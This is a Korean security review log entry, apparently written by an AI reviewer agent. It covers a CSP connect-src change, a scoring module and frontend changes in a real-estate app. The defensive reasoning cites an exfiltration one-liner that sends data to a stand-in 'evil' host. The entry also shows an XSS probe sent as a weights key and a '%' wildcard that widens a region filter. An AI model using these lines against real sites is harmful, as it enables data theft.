@@ -2778,3 +2778,253 @@ referer https://realestate.utilverse.info/ -> HTTP 401
 4. nginx **TEMP-REG-BLOCK 제거** + `nginx -t` → reload → 5. `/auth/register` 보안헤더 5/5 재확인.
 
 **사용자에게 올릴 것**: SR19-1(카카오 JS 키 도메인 등록이 3회 측정 모두 미반영 — 콘솔 재확인).
+
+---
+
+## SR-021 · 2026-07-26 · **가중치 반영(WEIGHT-1) · UI/UX 재설계(UX-1) · ★CSP `connect-src` 판정** (security-reviewer, herdr re-review 대행)
+
+**판정: PASS** — 배포를 막을 보안 사유 없음.
+**CSP 판정: `connect-src` 에 `https://dapi.kakao.com` 을 추가한다(ADD).** 근거는 §1.
+대상: SR-020 이후 미커밋 변경 — `app/agents/scoring.py`(신규) · `orchestrator.py` · `recommend.py` · 프론트 대량(신규 20여 파일)
+재현: backend **756 tests / 0 failures / 63 skipped = 693 passed** · frontend **27 files / 358 passed** — 지시 수치 일치
+
+---
+
+### 1) ★ CSP `connect-src` 판정 — **추가한다**
+
+#### 1-A. 먼저 사실관계부터 — 추측이 아니라 **SDK 원본을 읽었다**
+
+담당자가 "실브라우저 검증 전"이라고 한 지점(XHR인가 JSONP인가)을 **코드로 확정**했다.
+`https://t1.daumcdn.net/mapjsapi/js/libs/services/1.1.1/services.js` (6,349 B) 를 내려받아 분석:
+
+```
+XMLHttpRequest      : 1        callback            : 0
+onreadystatechange  : 1        jsonp / JSONP       : 0
+responseText        : 2        createElement(script): 0
+참조 호스트          : dapi.kakao.com  (유일)
+```
+
+실제 전송부:
+
+```js
+var Ajax = !IE_VERSION || 9 < IE_VERSION
+  ? function(b){
+      var a = new XMLHttpRequest;
+      a.open("GET", b.url + "?" + Util.serialize(b.params), !0);
+      a.setRequestHeader("KA", KA_HEADER_STRING);
+      a.setRequestHeader("Authorization", AUTH_HEADER_STRING);   // "KakaoAK " + APP_KEY
+      ...
+    }
+  : function(b){ var a = new XDomainRequest; ... }               // IE9 이하
+var DOMAIN = PROTOCOL + "//dapi.kakao.com",
+    URL = { GEO: DOMAIN+"/v2/local/geo/", SEARCH: DOMAIN+"/v2/local/search/" };
+```
+
+**JSONP가 아니다. 순수 XHR이다.** 따라서 현재 `connect-src 'self'` 에서 **반드시 막힌다.**
+게다가 `Authorization`·`KA` 라는 **커스텀 헤더**를 붙이므로 요청이 non-simple 이 되어
+**CORS preflight(OPTIONS)** 가 먼저 나가는데, `connect-src` 는 preflight도 똑같이 통제한다.
+즉 우회로가 없다 — 추가하지 않으면 이 기능은 **100% 동작하지 않는다.**
+
+#### 1-B. 판정: **ADD** — 이유를 정직하게 적는다
+
+내가 SR-019에서 "connect-src 를 넓히면 반출 경로가 하나 는다"고 쓴 것은 사실이고, 지금도 유효하다.
+그런데 그 문장을 이 사안에 적용하면 결론은 **추가하는 쪽**이다. 세 가지 때문이다.
+
+**① 이미 더 센 권한을 준 상대다.**
+`https://dapi.kakao.com` 은 **이미 `script-src` 에 있다.** 그 출처의 스크립트는 우리 오리진에서
+**임의 코드를 실행**할 수 있다 — DOM을 읽고, 쿠키를 실은 채 우리 API를 부르고, 원하는 대로 반출할 수 있다.
+그에 비하면 "그 호스트로 XHR을 **보낼** 수 있다"는 **엄격히 약한 권한**이다.
+코드 실행을 허용해 둔 상대에게 데이터 전송을 막는 것은 방어가 아니라 **모양새**다.
+
+**② 이 CSP는 애초에 반출을 막는 물건이 아니다(내가 SR-019에서 실증했다).**
+`navigate-to` 지시어는 표준에서 빠져 브라우저에 없고, WebRTC는 CSP에 지시어 자체가 없다.
+따라서 XSS가 성립하면 `location.href='https://evil/?d='+data` 로 **이미 전부 나간다.**
+`connect-src` 한 줄을 조여 봐야 "데이터가 나갈 수 있는가"의 답은 **이미 예**다.
+이번 추가의 실제 델타는 "공격자가 제어하지 못하는 제3자에게 향하는, 되읽을 수 없는 단방향 채널 1개"뿐이다.
+반면 **CSP의 진짜 기여(주입 코드의 실행 차단 = `script-src` 에 `'unsafe-inline'`·`'unsafe-eval'` 없음)는
+전혀 손상되지 않는다.**
+
+**③ 대안이 더 나쁘다.**
+서버 프록시를 두면 REST 키를 쓰게 되는데, 그건 **서버 전용 비밀키**를 요청당 노출 경로에 올리는 일이고
+rate limit·비용·마스킹 부담이 새로 생긴다. 기능을 포기하면 사용자가 요청한 기능이 죽는다.
+지금 구조(JS SDK + 공개용 JS 앱키)가 **가장 적은 비밀을 쓰는 선택**이다.
+
+> 반대로, 만약 `dapi.kakao.com` 이 `script-src` 에 **없었다면** 나는 반대했을 것이다.
+> 새 출처를 반출 경로로만 여는 것은 대가 없이 표면만 넓히는 일이기 때문이다.
+> 여기서는 그 조건이 성립하지 않는다.
+
+#### 1-C. 정확한 값 — **`connect-src` 한 곳만 바꾼다**
+
+```
+default-src 'self'; script-src 'self' https://dapi.kakao.com https://t1.daumcdn.net; style-src 'self' 'unsafe-inline'; img-src 'self' https://t1.daumcdn.net https://mts.daumcdn.net https://s1.daumcdn.net; connect-src 'self' https://dapi.kakao.com; font-src 'self'; object-src 'none'; base-uri 'none'; form-action 'self'; frame-ancestors 'none'
+```
+
+변경분은 **`connect-src 'self'` → `connect-src 'self' https://dapi.kakao.com`** 뿐이다.
+`default-src` 는 건드리지 않는다. 와일드카드·`data:`·서브도메인 와일드카드 전부 쓰지 않는다.
+`t1.daumcdn.net` 은 `connect-src` 에 **넣지 않는다**(스크립트·이미지 로드일 뿐 XHR 대상이 아니다).
+
+**반드시 함께 할 것 — 테스트가 깨진다(그게 정상이다):**
+`backend/tests/test_deploy_config.py::test_기본_차단과_프레임_방어가_들어_있다` 가
+`_directive("connect-src") == ["'self'"]` 를 단언하므로 **실패한다.** 값과 함께 고칠 것.
+이 참에 SR19-2에서 권고한 **지시어별 정확 집합 단언**으로 바꾸면 "출처를 넓히는 변경"도 잡힌다:
+```python
+assert set(_directive("connect-src")) == {"'self'", "https://dapi.kakao.com"}
+```
+
+#### 1-D. ⚠️ CSP를 고쳐도 이 기능은 아직 안 될 수 있다 (SR19-1 연동)
+
+`services.js` 는 XHR에 `Authorization: KakaoAK <JS앱키>` 를 실어 `dapi.kakao.com` 을 부른다.
+그런데 **SR19-1이 아직 열려 있다** — 카카오 JS 앱키의 웹 도메인 허용목록에 우리 도메인이
+등록돼 있지 않다(SR-019·SR-020에서 3회 측정, 전부 `401 domain mismatched`).
+로컬 API 호출은 SDK 로더보다 도메인 검사가 엄격할 가능성이 높다.
+
+→ **예측**: CSP를 고쳐도 장소 검색이 401로 실패할 수 있다. 그때 **CSP를 더 풀지 말 것** —
+원인은 CSP가 아니라 카카오 콘솔의 도메인 등록이다. 담당자가 실패를 조용히 삼키지 않고
+"장소 검색을 사용할 수 없습니다"를 노출하게 만든 설계 덕분에 이 구분이 화면에서 드러난다. 좋은 판단이다.
+
+---
+
+### 2) WEIGHT-1 — 자산 유출(SR4-2) 회귀 없음
+
+#### 2-A. 구조적 격리 — `scoring.py` 는 자산을 **아예 모른다**
+
+신규 `app/agents/scoring.py` 전수 검색: `cash`·`income`·`loan`·`forbidden`·`affordability` **0건**.
+가중치와 에이전트 점수만 받는다. 자산이 이 모듈에 도달할 인자 자체가 없다 — 1차 방어는 구조다.
+
+#### 2-B. 변이로 그물 확인 — **탐지됨**
+
+`orchestrator.py` 의 `score_notes` 에 자산 원본을 주입:
+```python
+"score_notes": list(score.notes) + [f"보유현금 {ctx.affordability.usable_cash_krw:,}원 기준"],
+```
+→ **3건 FAIL**(`test_scoring.py` 포함). 원복 후 바이트 동일 확인 + 전체 재실행 정상.
+"8/8 KILLED" 주장은 내가 독립적으로 넣은 변이에서도 재현된다.
+
+#### 2-C. confidence 를 곱하지 않는 판단 — **타당하다**
+
+보안 사안은 아니지만 판정을 요구했으니 답한다. **동의한다.**
+사용자가 준 30%가 내부 신뢰도로 조용히 21%가 되면, 슬라이더는 **예측 불가능한 장치**가 된다.
+이 제품의 신뢰는 "왜 이 순위인가"를 설명할 수 있는 데 있는데, 사용자가 만질 수 있는 값과 실제 적용값이
+말없이 달라지면 그 설명이 성립하지 않는다. 근거가 약한 축은 **곱해서 희석**하는 대신
+**제외하고 재정규화 + 3중 고지**(`score_axes`·`score_notes`·전체 `notes`)한 쪽이 정직하다 —
+"약하게 반영했다"보다 "반영하지 않았고 그 사실을 말한다"가 검증 가능하다.
+
+---
+
+### 3) 지시받은 확인 항목
+
+#### 3-1. 역 검색 입력 — 인젝션·좌표 위조
+
+| 항목 | 결과 |
+|---|:--|
+| 키워드 → SDK | `Util.serialize` 가 `encodeURIComponent(k)+"="+encodeURIComponent(v)` 로 인코딩(원본 확인) — URL 인젝션 불성립 |
+| 좌표 파싱 | `coord()` 가 **빈 문자열·공백을 `Number()` 이전에 거부**하고 `Number.isFinite` 로 재확인 → `Number('')===0` 버그 해소 확인 |
+| 결과 채택 | `toPlace` 가 lng·lat 둘 다 유효하고 `place_name` 이 비어 있지 않을 때만 반환 |
+| 좌표 순서 | `x=경도 · y=위도` 를 `[lng, lat]` 로 유지(뒤집힘 없음) |
+| 실패 처리 | `throw` 하지 않고 `unavailable`/`empty`/`failed` 상태로 화면에 노출 — 조용한 실패 없음 |
+
+**잔여(SR21-3, info)**: `Number.isFinite` 는 통과하지만 **위경도 범위 검증은 없다.**
+`x=99999` 같은 값도 유한수라 통과한다. 출처가 카카오 API라 공격자 제어가 아니고 결과는 "지도가 엉뚱한 곳을
+비춘다" 정도라 info. 권고: `-180≤lng≤180`, `-90≤lat≤90` (더 좁히려면 수도권 bbox) 한 줄 추가.
+
+#### 3-2. XSS — 신규 DOM 경로 전수
+
+프론트 `src/**` 전수 검색: `innerHTML`·`dangerouslySetInnerHTML`·`insertAdjacentHTML`·`outerHTML`·
+`eval(`·`new Function`·`document.write` **실사용 0건**(전부 "쓰지 마라"는 주석). 마커 라벨은 여전히
+`row.textContent = line`. 신규 컴포넌트(`PlaceSearch`·`RegionPicker`·`FilterRail`·`InfoTip`·`MapLegend`)도
+JSX 텍스트 자식으로만 렌더 → React 자동 이스케이프. **XSS 싱크 0.**
+
+#### 3-3. 지역 목록 번들 포함 — **수용 가능**
+
+`lib/regions.ts` 는 행정안전부 법정동코드에서 생성된 **공개 행정구역 데이터**다. 민감정보 0.
+중요한 건 **한계를 숨기지 않는다**는 점 — "행정구역 기준이지 '데이터가 있는 지역' 목록이 아니다"를
+주석과 `RegionPicker` 안내 문구 양쪽에 적어 두었고, 서버 엔드포인트가 생기면 이 파일만 바꾸면 되게
+호출부를 분리했다. 이 프로젝트가 지켜 온 "모르는 걸 모른다고 보여준다"와 일치한다. 수용 가능하다.
+
+#### 3-4. 인증 회귀 — 없음
+
+`accessToken` 은 모듈 스코프 `let` **1개**(메모리 전용), `localStorage`/`sessionStorage`/`document.cookie`
+**실사용 0건**(주석뿐). `X-Requested-With` 유지, 쿠키 경로는 `credentials:"include"`.
+
+**`mapCamera` 가 저장소를 안 쓰는 판단 — 타당하다.** 지도 위치는 "내가 어느 동네에서 집을 보고 있는지"라
+**그 자체로 사생활**이고, 이 앱의 저장소 금지 원칙(토큰)과 같은 선상이다. 모듈 메모리라 탭을 닫으면
+사라지는 것도 맞다. 편의(재마운트 시 자리 유지)를 얻으면서 영속 흔적을 남기지 않는 절충이 적절하다.
+
+#### 3-5. `score_notes`·`notes` 의 사용자 입력 반사 — **반사가 있다(SR21-2, low)**
+
+지시받은 질문의 답은 **"있다"** 이다. `scoring.py:417-420` 이 사용자가 보낸 **가중치 키 이름을 그대로**
+문장에 넣는다:
+
+```python
+notes.append(f"가중치 항목 {', '.join(sorted(set(unknown_keys)))} 은(는) 무시했습니다 — …")
+```
+
+직접 실행해 확인:
+
+| 보낸 `weights` | 결과 |
+|---|:--|
+| `{"<script>alert(1)</script>": .5, "price": .5}` | 노트에 **태그 문자열 그대로** 반사(길이 143) |
+| `{"A"×2000: .5, "price": .5}` | 노트 길이 **2,118자** |
+| 키 300개 | 노트 길이 **1,806자** |
+
+그리고 이 문자열은 ① `recommendation_job.result_meta`(**평문 jsonb**)에 저장되고 ② 화면에 렌더된다.
+스키마는 `weights: dict[str, float]` 뿐 — **키 이름 길이·개수 제한이 없다.**
+
+**그런데 XSS는 아니다**: React가 이스케이프하므로 `<script>` 는 글자로 보인다(3-2 확인).
+**타인에게도 미치지 않는다**: `result_meta` 는 IDOR로 보호돼 본인만 읽는다(SR-020 확인).
+**증폭도 제한적이다**: nginx `client_max_body_size 1m` 이 요청 본문을 1MB로 묶는다.
+
+→ 결론: **low, 비차단.** 남는 것은 "검증되지 않은 사용자 입력이 평문 컬럼에 영속되고 다시 표시된다"는
+위생 문제다. 권고: `weights` 키를 `WEIGHT_AXES` 로 제한하거나 **개수·길이 상한**(예: 키 20개·32자)을 두고,
+반사할 때 목록을 잘라서(예: 상위 5개 + "외 N개") 넣을 것.
+
+#### 3-6. 부수 — `region_codes` 항목 패턴 미검증 (SR21-4, info)
+
+`region_codes: list[str] = Field(..., max_length=50)` 은 **개수만** 제한하고 항목 형식은 안 본다.
+SQL은 `unnest(CAST(:region_codes AS text[]))` + `c.region_code LIKE rc || '%'` 로 **완전한 파라미터 바인딩**이라
+**인젝션은 불성립**이다. 다만 `%` 를 코드로 보내면 `LIKE '%%'` 가 되어 **선택하지 않은 지역까지 후보에 들어온다.**
+`complex` 는 공개 아파트 마스터라 사생활 문제는 없고 `LIMIT 50` 이 걸려 있어 info.
+권고: 항목에 `pattern=r"^\d{5}$"` 한 줄.
+
+---
+
+### 4) 재현·회귀
+
+| 항목 | 결과 |
+|---|:--|
+| backend | **756 tests / 0 failures / 0 errors / 63 skipped = 693 passed** — 지시 수치 일치 |
+| frontend | **27 files / 358 passed** — 지시 수치 일치 |
+| SR4-2 변이 | `score_notes` 에 자산 원본 주입 → **3건 FAIL**(탐지). 원복 바이트 동일 |
+| 인증 회귀 | access 메모리 전용 · refresh 쿠키 · `X-Requested-With` · localStorage 0건 |
+| IDOR | `result_meta` 저장·조회 모두 `user_id` 조건 유지(SR-020 확인분 무변경) |
+| SQL | 신규 f-string SQL 0건. `region_codes` 는 배열 파라미터 바인딩 |
+
+> ※ 측정 중 `test_scoring.py::test_음수_NaN_은_버린다` 가 1회 실패했다가 연속 2회 0 fail 로 돌아왔다.
+> 내 변이는 바이트 단위로 원복됐음을 확인했고, 해당 파일은 내가 건드리지 않았다 —
+> SR-019·SR-020 때와 같은 **동시 편집 중 일시 현상**으로 본다. 배포 직전 트리 동결 후 최종 그린 확인 권고.
+
+---
+
+### 신규 발견 요약
+
+| ID | 심각도 | 제목 | 차단 |
+|---|:--:|---|:--:|
+| `SR21-1` | — (조치) | **CSP `connect-src` 에 `https://dapi.kakao.com` 추가** — services.js가 XHR임을 원본으로 확정. 미추가 시 기능 100% 불가 | 배포 시 반영 |
+| `SR21-2` | low | 사용자 `weights` 키가 `score_notes`/`notes` 로 반사되어 **평문 컬럼에 영속·렌더**. XSS는 아님(React 이스케이프·IDOR 보호·1MB 상한) | 비차단 |
+| `SR21-3` | info | 장소 검색 좌표에 **위경도 범위 검증 없음**(유한수면 통과) | 비차단 |
+| `SR21-4` | info | `region_codes` 항목 패턴 미검증 — 인젝션은 불성립이나 `%` 로 지역 선택이 무력화됨 | 비차단 |
+| `SR19-1` | medium(유지) | 카카오 JS 키 도메인 허용목록 미반영 — **CSP를 고쳐도 장소 검색이 401일 수 있다**(§1-D) | 비차단 |
+
+### 판정
+
+**PASS — 배포를 막을 보안 사유 없음.**
+
+이번 변경의 보안 표면 증가는 **CSP `connect-src` 한 항목**뿐이고, 그 대상은 이미 `script-src` 로
+더 센 권한을 준 동일 출처다. 새 코드(`scoring.py`)는 자산을 구조적으로 모르고, 변이로 그물도 확인했다.
+프론트는 대량 변경에도 XSS 싱크 0·저장소 사용 0을 유지했다.
+
+**배포 시 함께 할 것**
+1. `deploy/nginx-realestate.conf` 의 `map $host $re_csp` 값에서 `connect-src 'self'` →
+   **`connect-src 'self' https://dapi.kakao.com`** (§1-C 전체 값 참조).
+2. `test_deploy_config.py` 의 `connect-src` 단언 갱신 — 이 참에 **정확 집합 단언**으로(SR19-2 해소).
+3. 배포 후 장소 검색을 실브라우저로 1회 확인. **401이면 CSP를 더 풀지 말고** 카카오 콘솔 도메인 등록을 볼 것(§1-D).
